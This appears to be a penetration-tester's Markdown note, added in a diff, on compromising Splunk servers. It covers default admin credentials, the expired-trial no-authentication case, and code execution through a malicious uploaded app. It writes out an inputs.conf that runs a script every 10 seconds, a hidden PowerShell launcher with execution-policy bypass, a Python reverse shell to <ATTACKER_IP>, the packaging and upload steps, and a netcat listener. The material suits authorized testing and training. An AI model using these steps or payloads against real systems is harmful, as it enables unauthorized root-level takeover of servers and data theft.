@@ -1,0 +1,185 @@
+---
+Primary_category: "[[WEB TECHNOLOGIES]]"
+title: "SPLUNK"
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags:
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[WEB TECHNOLOGIES]]
+
+#### *Discovery | Footprinting | Enumeration*
+
+This service is usually running as *ROOT* or *LOCAL SYSTEM*, so if we manage to access the control panel, there are serveral ways we can achieve code execution and then compromise the entire server
+
+##### *Default Credentials*
+
+In old *SPLUNK* installations, the default login credentials will be displayed in the login panel itself
+
+![[SPLUNK-20260329163656162.webp|350]]
+
+> ***Zoom in**
+
+However, its latest versions set credentials during the installation process, the user remains an *admin* but the password is generated at runtime
+
+![[SPLUNK-20260329164106082.webp|350]]
+
+> ***Zoom in***
+
+Nevertheless, the default user is *admin*, we should try some default credentials such as →
+
+```bash
+admin:changeme
+admin:admin
+admin:Welcome
+admin:Welcome1
+admin:Password123
+```
+
+##### *TCP Ports*
+
+This service usually has two listening ports on the given server, namely the *8000* and *8089* ports
+
+The former is the administration panel itself, while the latter corresponds to the *SPLUNK* management port for communication
+
+> ***NMAP Scan Output***
+
+```bash
+...<SNIP>...
+8000/tcp open  ssl/http      Splunkd httpd
+8089/tcp open  ssl/http      Splunkd httpd
+...<SNIP>...
+```
+
+##### *Trial Version*
+
+It's important to note that *SPLUNK* offers a trial version which becomes a *FREE* version with no authentication required after 60 days
+
+Therefore, we must bear in mind that there is a possibility that a sysadmin carried out a *SPLUNK* trial installation to test the software and then he forgets all about it, and after 60 days we have direct access to the administration panel without any authentication
+
+So, we can compromise the entire server where *SPLUNK* is installed if it is running as *ROOT* or *LOCAL SYSTEM*
+
+---
+
+#### *Code Execution*
+
+##### *Scripted Inputs*
+
+> ***Custom Splunk Applications***
+
+> ***[Reverse Shell Splunk](https://github.com/0xjpuff/reverse_shell_splunk)***
+
+###### *Creating a Custom Splunk Application*
+
+First, we must create a custom application with the following structure
+
+```bash
+splunk_app/
+├── bin
+└── default
+```
+
+The *TAR.GZ* archive must contain the two directories above
+
+The *bin* directory will contain the scripts we want to run. On the other hand, the *default* directory only stores the *inputs.conf* file, which tells *SPLUNK* which script to run and any other conditions, such as the script execution interval *( in seconds )*
+
+> [!BUG]- *Inputs.conf*
+>
+> ```bash
+> [script://./bin/rev.py]
+> disabled = 0  
+> interval = 10  
+> sourcetype = shell 
+> 
+> [script://.\bin\run.bat]
+> disabled = 0
+> sourcetype = shell
+> interval = 10
+> ```
+>
+
+- ***Windows*** 🪟
+
+If the target is a *Windows* machine, we have to put ***[this](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)*** script inside the *bin* directory
+
+> ***The script must be called run.ps1***
+
+Moreover, we must create a *BATCH ( .bat )* file which will run when the application is deployed and execute the *Powershell* script
+
+> ***run.bat***
+
+```bash
+@ECHO OFF
+PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
+Exit
+```
+
+Then, we will have the following directory structure
+
+```bash
+app
+├── bin
+│   ├── run.bat
+│   └── run.ps1
+└── default
+    └── inputs.conf
+```
+
+- ***Linux*** 🐧
+
+On the other hand, if the target is a *Linux* machine, we must replace both the *run.ps1* and *run.bat* scripts by a simple *rev.py* script
+
+> [!BUG]- *Run.py*
+>
+> ```python
+> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+> ```
+>
+
+And we will get the following directory structure
+
+```bash
+app
+├── bin
+│   └── rev.py
+└── default
+    └── inputs.conf
+```
+
+Next, we have to create the *TAR.GZ* archive
+
+```bash
+tar -czvf app.tar.gz app
+```
+
+###### *Uploading the APP File*
+
+Now we have to upload the created application archive. To do so, given the following *URL*, proceed as follows
+
+> ***<URL\>/app/launcher/home***
+
+![[SPLUNK-20260329175059179.webp|350]]
+
+> ***Zoom in***
+
+Then, select the *Install app from file* option
+
+![[SPLUNK-20260329175153309.webp|350]]
+
+> ***Zoom in***
+
+Once we are on the upload form page, simply select the *Browse* option in order to choose the given archive and then click *Upload*
+
+![[SPLUNK-20260329175608136.webp|350]]
+
+> ***Zoom in***
+
+###### *Receiving the Reverse Shell*
+
+Since the uploaded script will run every 10 seconds, we can set up a *TCP* listener after uploading the malicious *SPLUNK* app
+
+```bash
+rlwrap -CaR nc -nlvp <ATTACKER_PORT>
+```
